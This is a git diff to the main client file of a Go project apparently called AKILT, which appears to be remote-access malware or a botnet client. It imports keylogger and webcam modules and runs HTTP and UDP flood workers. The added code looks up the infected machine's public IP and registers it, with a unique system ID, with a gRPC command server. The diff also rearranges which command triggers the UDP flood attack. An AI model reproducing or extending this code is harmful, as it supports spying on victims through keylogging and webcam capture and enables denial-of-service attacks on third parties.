@@ -23,6 +23,7 @@ import (
 	"github.com/Xart3mis/AKILT/Client/lib/consumer"
 	"github.com/Xart3mis/AKILT/Client/lib/keylogger"
 	"github.com/Xart3mis/AKILT/Client/lib/reg"
+	"github.com/Xart3mis/AKILT/Client/lib/utils"
 	"github.com/Xart3mis/AKILT/Client/lib/webcam"
 	"google.golang.org/grpc"
 
@@ -60,11 +61,18 @@ func main() {
 	if err != nil {
 		log.Fatalln(err)
 	}
-
 	pid := reg.GetUniqueSystemId()
 	bundles.WriteFiraCodeNerd()
 
 	ctx, cancel := context.WithCancel(context.Background())
+
+	ip, err := utils.GetPublicIP()
+	if err != nil {
+		log.Println(err)
+	}
+
+	c.RegisterClient(ctx, &pb.RegisterData{Ip: ip, Id: &pb.ClientDataRequest{ClientId: pid}})
+
 	receiver, err := consumer.SubscribeOnScreenText(ctx, c, pid)
 	if err != nil {
 		log.Fatalln("Error subscribing to screen text: ", err)
@@ -128,6 +136,8 @@ func main() {
 
 	receiver.CloseSend()
 	window.Destroy()
+
+	c.UnregisterClient(ctx, &pb.RegisterData{Ip: ip, Id: &pb.ClientDataRequest{ClientId: pid}})
 	cancel()
 }
 
@@ -275,8 +285,6 @@ func flood_worker(client pb.ConsumerClient, ctx context.Context) {
 			httpflood.FloodUrl(flood.GetUrl(), time.Duration(flood.GetLimit())*time.Second,
 				flood.GetNumThreads())
 		case 2:
-			//
-		case 3:
 			udpflood.UdpFloodUrl(flood.GetUrl(), flood.GetNumThreads(),
 				time.Duration(flood.GetLimit())*time.Second)
 		}
